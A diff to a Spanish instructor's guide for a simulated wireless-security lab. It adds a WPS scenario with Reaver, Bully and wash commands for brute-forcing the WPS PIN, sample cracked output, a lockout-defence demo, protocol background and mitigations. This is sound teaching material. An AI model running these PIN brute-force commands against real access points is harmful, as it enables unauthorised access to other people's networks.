@@ -20,7 +20,7 @@ sudo ./despliegue.sh
 ```
 
 El script instala lo que falte (`hostapd`, `hcxtools`, `pocl-opencl-icd`,
-`ocl-icd-libopencl1`), levanta los 6 escenarios y, al terminar, imprime el
+`ocl-icd-libopencl1`), levanta los 7 escenarios y, al terminar, imprime el
 **SSID, canal y BSSID real** de cada uno (las claves no se muestran). Los BSSID
 cambian en cada despliegue. Las interfaces de trabajo del alumno son
 **`wlan0` … `wlan6`**.
@@ -66,9 +66,11 @@ sudo iw dev wlan0 set channel 11
 | `he_pmkid`      | 11 | WPA2-PSK    | PMKID **con** clientes asociados           | `butterfly` |
 | `he_pmkid_nc`   | 4  | WPA2-PSK    | PMKID **sin** clientes (*clientless*)      | `football` |
 | `he_enterprise` | 3  | WPA2-EAP    | Análisis pasivo de EAP-PEAP                | Identidad `alumno@iesvjp.es` · tipo EAP 25 (PEAP) · cert. `radius.domain.lab` |
+| `he_wps`        | 7  | WPA2-PSK + WPS | Fuerza bruta online del PIN WPS         | PIN y clave **aleatorios en cada despliegue** (ver sección 7) |
 
-Las tres claves WPA2 y la contraseña del usuario Enterprise (`computer`)
-están en `rockyou.txt`.
+Las tres claves WPA2 de `he_wpa2`, `he_pmkid` y `he_pmkid_nc` y la contraseña
+del usuario Enterprise (`computer`) están en `rockyou.txt`. La clave de
+`he_wps` **no** está en ningún diccionario, a propósito.
 
 ---
 
@@ -607,8 +609,9 @@ El `grep` es necesario: la captura también contiene el M2 que ha enviado
 ### Por qué hubo que recompilar hostapd para el método A
 
 `compila_hostapd_pmkid.sh` aplica **dos** parches a hostapd 2.10. Los dos
-afectan solo al binario `hostapd-pmkid` (escenarios `he_pmkid` y
-`he_pmkid_nc`); el resto de escenarios usa el hostapd del sistema.
+afectan solo al binario `hostapd-pmkid` (escenarios `he_pmkid`, `he_pmkid_nc`
+y, por el parche 2, también `he_wps`); el resto de escenarios usa el hostapd
+del sistema.
 
 1. **PMKID en el M1 con WPA-PSK** (`src/ap/wpa_auth.c`). El hostapd de serie
    solo incluye el PMKID en el M1 con 802.1X, SAE u OWE. Sin este parche no
@@ -640,7 +643,8 @@ hcxdumptool deja una estación "fantasma" hasta que caduca por inactividad
 (unos 5 minutos).
 
 Es la misma limitación que impide el fake auth (`aireplay-ng -1`) en el
-escenario WEP.
+escenario WEP, y la que obliga a usar este binario en `he_wps` (Reaver y
+Bully también se asocian desde modo monitor).
 
 **Comparación (respuesta a la pregunta de la guía del alumno):**
 
@@ -887,6 +891,346 @@ contra otros servicios NTLM, sin conocer la contraseña en claro.
 
 ---
 
+## 7. `he_wps` — WPS: fuerza bruta online del PIN
+
+AP WPA2-PSK con **WPS activo** y PIN de AP habilitado. La clave WPA2 son 16
+caracteres aleatorios: no cae por diccionario, ni con el handshake ni con el
+PMKID. La lección es que **WPS entrega la clave WPA2 sin necesidad de
+crackearla**: basta con adivinar un PIN de 8 dígitos, y por un fallo de diseño
+del protocolo eso cuesta como mucho 11.000 intentos.
+
+### Cómo está montado el escenario
+
+- **PIN y clave aleatorios en cada despliegue.** `despliegue.sh` los genera al
+  arrancar y no quedan ni en el script ni en disco. Cada despliegue tiene una
+  solución distinta (ver "Consultar la solución" más abajo).
+- **PIN acotado para que quepa en una clase.** La primera mitad está entre
+  `0000` y `0099` y la segunda entre `000` y `099`, más el dígito de checksum.
+  Reaver recorre los PINs en orden ascendente, así que el ataque necesita como
+  mucho unos 200 intentos. En un router real serían hasta 11.000.
+- **Watchdog anti-bloqueo.** hostapd bloquea el PIN tras 3 fallos (ver el
+  fundamento técnico). Un bucle en segundo plano (`LAB_WPS_WATCHDOG`) vuelve a
+  fijar el PIN cada segundo con `hostapd_cli wps_ap_pin set`, lo que pone a
+  cero los contadores de fallos y desbloquea el AP. Simula un router **sin
+  protección contra fuerza bruta**, que es el caso real vulnerable.
+- **Un cliente legítimo** (`wlan_cli_wps`, `192.168.7.10`) hace ping al AP.
+  Da realismo (la red "tiene uso" en airodump) y sirve para comprobar que el AP
+  funciona. **No hace falta para el ataque**: WPS se ataca directamente contra
+  el AP.
+- **Usa el binario `hostapd-pmkid`**, por su parche 2 (no exigir ACK). Reaver
+  y Bully se autentican y se asocian desde modo monitor, con el mismo problema
+  que hcxdumptool y el fake auth de WEP (ver sección 5). Con el hostapd del
+  sistema, la asociación nunca se completa. Efecto secundario: el AP también
+  emite PMKID, pero con una clave aleatoria de 16 caracteres no sirve de nada.
+  Es un buen contraste para el alumno.
+
+Al desplegar deben salir `[✓] AP he_wps con WPS activo (PIN de AP habilitado)`
+y `[✓] Cliente he_wps conectado`.
+
+### Consultar la solución (profesor)
+
+```bash
+CLI="hostapd_cli -p /var/run/hostapd_wps -i wlan_ap_wps"
+sudo ip netns exec ns_ap_wps $CLI wps_ap_pin get              # PIN del AP
+sudo ip netns exec ns_ap_wps $CLI get_config | grep -E 'wps_state|passphrase'
+```
+
+Si `get_config` no muestra la passphrase, se obtiene en un solo intento con
+Reaver indicando el PIN: `reaver ... -p <PIN>` (ver apartado b).
+
+### a) Detectar APs con WPS (`wash`)
+
+```bash
+sudo airmon-ng start wlan0 7             # -> wlan0mon
+sudo wash -i wlan0mon -c 7
+```
+
+Salida esperada (columnas principales):
+
+```
+BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
+--------------------------------------------------------------------------------
+02:00:00:00:15:00    7  -30  2.0  No             he_wps
+```
+
+- `WPS 2.0`: versión del protocolo que anuncia el AP en sus beacons.
+- `Lck No`: el PIN de AP **no** está bloqueado (*AP Setup Locked*). Si sale
+  `Yes`, el AP rechaza los intentos de PIN.
+
+`wash` lee el **elemento WPS** (*vendor specific*, OUI `00:50:F2`, tipo 4) que
+el AP incluye en beacons y *probe responses*. Desde fuera se sabe si WPS está
+activo y si está bloqueado sin enviar nada al AP.
+
+### b) Método 1 — Reaver
+
+```bash
+BSSID=<BSSID_WPS>
+sudo reaver -i wlan0mon -b $BSSID -c 7 -vv
+```
+
+Si Reaver pregunta `Restore previous session?`, responde **`n`** tras un
+redespliegue: el PIN ha cambiado y la sesión guardada no sirve.
+
+Salida típica de cada intento:
+
+```
+[+] Trying pin "00000000"
+[+] Sending authentication request
+[+] Sending association request
+[+] Associated with 02:00:00:00:15:00 (ESSID: he_wps)
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+[+] Received M3 message
+[+] Sending M4 message
+[+] Received WSC NACK            <- primera mitad incorrecta
+[+] Sending WSC NACK
+```
+
+Cuando acierta la primera mitad, el AP responde con **M5** en lugar de NACK y
+el progreso **salta a ~90,9 %** (10.000 de 11.000 combinaciones descartadas de
+golpe). Es un momento muy didáctico para preguntar al alumno por qué salta.
+Al terminar:
+
+```
+[+] Pin cracked in 214 seconds
+[+] WPS PIN: '00350259'
+[+] WPA PSK: 'Xk3pQ9vT2mLr8WzA'
+[+] AP SSID: 'he_wps'
+```
+
+**Resultado esperado:** el PIN y la clave aleatorios del despliegue actual
+(compruébalos con los comandos de "Consultar la solución").
+
+Con el PIN ya conocido, la clave se recupera en un solo intento. Esto
+demuestra que el PIN es una **credencial permanente**: aunque se cambie la
+clave WPA2, el PIN sigue entregando la nueva.
+
+```bash
+sudo reaver -i wlan0mon -b $BSSID -c 7 -p <PIN> -vv
+```
+
+Opciones útiles si Reaver se atasca en `hwsim`:
+
+| Opción | Para qué |
+|---|---|
+| `-N` | No enviar NACKs propios (algunos APs se cuelgan con ellos) |
+| `-d 0` | Sin espera entre intentos (por defecto 1 s) |
+| `-L` | Ignorar el estado *Locked* del AP y seguir probando |
+| `-T 1` / `-t 10` | Ajustar los timeouts de M5/M7 y de recepción |
+
+### c) Método 2 — Bully
+
+Bully hace el mismo ataque y es una reimplementación independiente en C. Sirve
+para contrastar herramientas y para cuando Reaver falla con un AP concreto.
+
+```bash
+sudo bully -b $BSSID -c 7 -S -A -v 3 wlan0mon
+```
+
+- **`-S` (secuencial) es imprescindible en este lab.** Por defecto Bully
+  prueba los PINs en **orden aleatorio**, y el acotado del PIN no acortaría
+  nada. En un router real da igual: el caso medio es el mismo.
+- **`-A`: no comprobar los ACK.** Bully espera ver la trama ACK de cada trama
+  que inyecta. `mac80211_hwsim` simula el ACK internamente (como estado de
+  transmisión) pero no emite tramas ACK al medio, así que Bully no las ve y se
+  queda en timeouts.
+- `-v 3` muestra cada mensaje M1…M8. Bully indica el resultado de cada intento
+  como `Pin1Bad` (falla la primera mitad, NACK tras M4) o `Pin2Bad` (falla la
+  segunda, NACK tras M6).
+
+Al terminar:
+
+```
+[*] Pin is '00350259', key is 'Xk3pQ9vT2mLr8WzA'
+```
+
+Bully guarda la sesión en `~/.bully/`. Tras un redespliegue, borra el fichero
+de ese BSSID o usa `-F` para forzar que empiece de cero.
+
+### d) Usar la clave obtenida
+
+```bash
+# wlan1 en modo managed
+wpa_passphrase he_wps '<CLAVE>' > wps.conf
+sudo wpa_supplicant -B -D nl80211 -i wlan1 -c wps.conf
+sudo ip addr add 192.168.7.50/24 dev wlan1
+ping -c 3 192.168.7.1
+```
+
+Alternativa sin conocer la clave, usando el PIN como **registrador externo**
+(es exactamente lo que hace Reaver, pero con `wpa_supplicant`):
+
+```bash
+sudo wpa_supplicant -B -D nl80211 -i wlan1 -C /var/run/wpa_supplicant_alumno
+sudo wpa_cli -p /var/run/wpa_supplicant_alumno -i wlan1 wps_reg <BSSID_WPS> <PIN>
+```
+
+### e) Demostración de la defensa: el bloqueo del PIN
+
+Para mostrar que el bloqueo frena el ataque, detén el watchdog y relanza
+Reaver:
+
+```bash
+sudo pkill -f LAB_WPS_WATCHDOG
+sudo reaver -i wlan0mon -b $BSSID -c 7 -vv
+```
+
+Tras 3 PINs incorrectos, Reaver muestra
+`WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking` y
+`wash` pasa a mostrar `Lck Yes`. Las esperas se duplican y, con 10 fallos
+seguidos, el bloqueo es indefinido. Con `-L` Reaver sigue enviando PINs, pero
+el AP los rechaza todos.
+
+Para desbloquear sin redesplegar:
+
+```bash
+CLI="hostapd_cli -p /var/run/hostapd_wps -i wlan_ap_wps"
+sudo ip netns exec ns_ap_wps sh -c "$CLI wps_ap_pin set \$($CLI wps_ap_pin get) 0"
+```
+
+Para volver a tener el watchdog, redespliega.
+
+### Problemas frecuentes
+
+- **Reaver se queda en `Sending authentication request` o
+  `Failed to associate`.** El AP no está corriendo con `hostapd-pmkid` o ese
+  binario es anterior al parche del ACK. Comprueba qué binario usa:
+  `ps -ef | grep 'wps/hostapd.conf'`.
+- **El despliegue avisa de que WPS no está activo, o el AP no arranca.** El
+  binario `hostapd-pmkid` se compiló sin `CONFIG_WPS=y`. Añádelo al `.config`
+  en `compila_hostapd_pmkid.sh` y recompila con `--force`.
+- **`wash` no muestra nada.** La interfaz no está en monitor o no está en el
+  canal 7. Usa `-c 7`.
+- **`wash` muestra `Lck Yes` sin haber parado el watchdog.** El watchdog se ha
+  caído. Compruébalo con `pgrep -f LAB_WPS_WATCHDOG` y redespliega.
+- **Reaver alterna `Received M1` y timeouts sin avanzar.** Prueba con `-N` y
+  `-d 0`.
+
+### Fundamento técnico
+
+**Qué es WPS.** *Wi-Fi Protected Setup* (Wi-Fi Alliance, 2006) se diseñó para
+que un usuario sin conocimientos conectara dispositivos sin teclear la clave
+WPA2. Tiene varios modos: botón (*PBC*), NFC y **PIN**. En el modo PIN de AP
+(*label*), el PIN de 8 dígitos suele estar impreso en la pegatina del router.
+Cualquiera que lo conozca puede actuar como **registrador externo** y pedirle
+al AP su configuración, que incluye la clave WPA2.
+
+**El protocolo (EAP-WSC).** El intercambio va dentro de EAP, con el método
+expandido de la Wi-Fi Alliance (*WSC*). Se hace antes del 4-way y sin cifrado
+de enlace. Aquí el AP actúa como *Enrollee* (E) y el atacante como *Registrar*
+(R):
+
+| Mensaje | Sentido | Contenido relevante |
+|---|---|---|
+| M1 | AP → R | Nonce N1, clave pública Diffie-Hellman **PKE** (1536 bits), datos del dispositivo |
+| M2 | R → AP | Nonce N2, clave pública DH **PKR** |
+| M3 | AP → R | **E-Hash1, E-Hash2** (compromisos del AP sobre las dos mitades del PIN) |
+| M4 | R → AP | **R-Hash1, R-Hash2** + R-S1 cifrado (prueba del registrador sobre la **1.ª mitad**) |
+| M5 | AP → R | E-S1 cifrado (el AP revela su secreto de la 1.ª mitad) |
+| M6 | R → AP | R-S2 cifrado (prueba sobre la **2.ª mitad**) |
+| M7 | AP → R | E-S2 cifrado + **configuración del AP: SSID y clave WPA2** |
+| M8 | R → AP | Confirmación (y, opcionalmente, nueva configuración) |
+
+Con el Diffie-Hellman de M1/M2 ambos derivan una clave de sesión de la que
+salen **AuthKey** (para los HMAC) y **KeyWrapKey** (para cifrar con AES los
+campos "cifrados"):
+
+```
+DHKey   = SHA-256(g^(ab) mod p)
+KDK     = HMAC-SHA256(DHKey, N1 ‖ MAC_Enrollee ‖ N2)
+AuthKey ‖ KeyWrapKey ‖ EMSK = KDF(KDK, "Wi-Fi Easy and Secure Key Derivation")
+```
+
+**El PIN se verifica en dos mitades:**
+
+```
+PSK1    = primeros 128 bits de HMAC-SHA256(AuthKey, PIN[1..4])
+PSK2    = primeros 128 bits de HMAC-SHA256(AuthKey, PIN[5..8])
+E-Hash1 = HMAC-SHA256(AuthKey, E-S1 ‖ PSK1 ‖ PKE ‖ PKR)
+E-Hash2 = HMAC-SHA256(AuthKey, E-S2 ‖ PSK2 ‖ PKE ‖ PKR)
+R-Hash1 / R-Hash2: lo mismo, con los secretos R-S1 / R-S2 del registrador
+```
+
+Es un esquema de *commitment* mutuo: cada parte se compromete con su
+conocimiento de cada mitad sin revelarla, y luego la va demostrando paso a
+paso, revelando sus nonces secretos (E-S1, R-S1…).
+
+**Qué se explota (Stefan Viehböck, diciembre de 2011):**
+
+1. **El AP confirma cada mitad por separado.** Tras recibir M4, el AP
+   comprueba R-Hash1 con R-S1:
+   - Si la **primera mitad** es incorrecta, responde con **NACK** en lugar de
+     M5.
+   - Si es correcta, envía M5. Con el M6 comprueba la **segunda mitad**: si
+     falla, NACK en lugar de M7.
+
+   El atacante sabe **qué mitad ha fallado**, así que ataca cada una por
+   separado: 10^4 combinaciones para la primera y luego 10^3 para la segunda.
+2. **El último dígito es un checksum.** El 8.º dígito se calcula a partir de
+   los 7 anteriores, así que la segunda mitad solo tiene 3 dígitos libres:
+
+   ```
+   checksum = (10 − (3·(d1+d3+d5+d7) + (d2+d4+d6)) mod 10) mod 10
+   ```
+
+   **Espacio total: 10^4 + 10^3 = 11.000 intentos** como máximo (5.500 de
+   media), en lugar de 10^8. Por eso Reaver salta al 90,9 % cuando acierta
+   la primera mitad.
+3. **El AP entrega la clave WPA2 en claro dentro del túnel.** En M7 el AP
+   envía su configuración (SSID, tipo de autenticación y **Network Key**)
+   cifrada con KeyWrapKey, que el atacante conoce porque él mismo negoció el
+   Diffie-Hellman. Acertar el PIN da la clave directamente, sea cual sea su
+   robustez.
+4. **Es un ataque online, pero sin sustituto offline para el defensor.** Cada
+   intento requiere hablar con el AP (unos segundos por intento), pero no
+   importa lo larga que sea la clave WPA2. A unos 2-10 s por intento, un
+   router real cae en horas, no en años.
+
+**Contraste con los escenarios anteriores:**
+
+| | `he_wpa2` / `he_pmkid` | `he_wps` |
+|---|---|---|
+| Qué se ataca | La passphrase | El PIN de WPS |
+| Tipo de ataque | Offline (diccionario) | **Online** (interacción con el AP) |
+| Espacio de búsqueda | Depende de la clave | **11.000**, fijo |
+| ¿Importa la robustez de la clave WPA2? | Sí, es la única defensa | **No** |
+| Defensa del AP | Ninguna posible (es offline) | Bloqueo tras fallos / desactivar WPS |
+
+**El bloqueo (*AP Setup Locked*) como defensa.** Al ser online, el AP puede
+limitar los intentos. hostapd bloquea el PIN tras **3 fallos** durante
+60 s, duplica la espera cada 3 fallos más y, con **10 fallos consecutivos**,
+lo bloquea indefinidamente hasta que se reactiva a mano. El estado se anuncia
+en el elemento WPS (`AP Setup Locked`), y por eso `wash` lo muestra. Muchos
+routers de la época no implementaban ningún bloqueo, o lo hacían mal (se
+reiniciaba con un reboot o con un deauth flood). El watchdog del lab simula
+precisamente esos routers.
+
+**Pixie Dust (Dominique Bongard, 2014) — no reproducible en este lab.** Es la
+evolución offline del ataque. Si el AP genera E-S1 y E-S2 de forma predecible
+(ceros, o un PRNG sembrado con la hora, como algunos chipsets de Ralink,
+Broadcom o Realtek), basta **un solo intercambio M1–M3**. Con PKE, PKR,
+AuthKey y los dos E-Hash, `pixiewps` prueba offline las 10^4 + 10^3
+combinaciones contra E-Hash1/E-Hash2 en segundos (`reaver -K`, `bully -d`).
+hostapd genera esos nonces con un RNG criptográfico, así que aquí Pixie Dust
+no funciona. Para enseñarlo habría que compilar un hostapd con E-S1 = E-S2 = 0.
+
+**Mitigación:**
+
+- **Desactivar WPS** (al menos el modo PIN) y comprobar con `wash` que de
+  verdad está desactivado. Algunos firmwares lo siguen anunciando aunque la
+  interfaz web diga lo contrario.
+- Si no se puede desactivar: firmware con bloqueo tras fallos y PIN no
+  impreso ni fijo.
+- El modo botón (PBC) es menos grave (ventana de 2 minutos tras pulsarlo),
+  pero también permite asociarse a quien esté cerca en ese momento.
+- **WPA3 no define WPS.** Su sustituto es **Wi-Fi Easy Connect (DPP)**, basado
+  en claves públicas (código QR) en lugar de un PIN corto.
+
+---
+
 ## Mantenimiento: cambiar las claves
 
 - **WPA2:** las claves se guardan como PMK (64 hex) en `despliegue.sh`, en el
@@ -905,6 +1249,11 @@ contra otros servicios NTLM, sin conocer la contraseña en claro.
   printf 'ilovemyfamily' | od -An -tx1 | tr -d ' \n'
   ```
 
+- **WPS:** no hay nada que cambiar: el PIN y la clave se generan en cada
+  despliegue. La **duración** del ataque se ajusta en `despliegue.sh` con los
+  módulos de `WPS_PIN7` (`RANDOM % 100` en cada mitad). Si los subes, el
+  ataque tarda más; con `% 10000` y `% 1000` tendrías el caso real completo.
+
 Tras cambiar una clave, actualiza la tabla de soluciones de esta guía.
 
 ---
@@ -915,6 +1264,10 @@ Tras cambiar una clave, actualiza la tabla de soluciones de esta guía.
 # Ver APs y namespaces activos
 ip netns list
 sudo ip netns exec ns_ap_pmkid_nc iw dev
+
+# Watchdog de WPS activo y estado del PIN
+pgrep -af LAB_WPS_WATCHDOG
+sudo ip netns exec ns_ap_wps hostapd_cli -p /var/run/hostapd_wps -i wlan_ap_wps wps_get_status
 
 # Apagar todo el laboratorio
 sudo ./limpia.sh
@@ -929,3 +1282,4 @@ sudo ./limpia.sh
   filtrado de PMKID/handshake)
 - **hashcat** (modo `22000` = WPA-PBKDF2-PMKID+EAPOL), en CPU mediante PoCL
 - **tshark** (análisis de capturas)
+- **reaver / wash** y **bully** (detección de WPS y fuerza bruta del PIN)
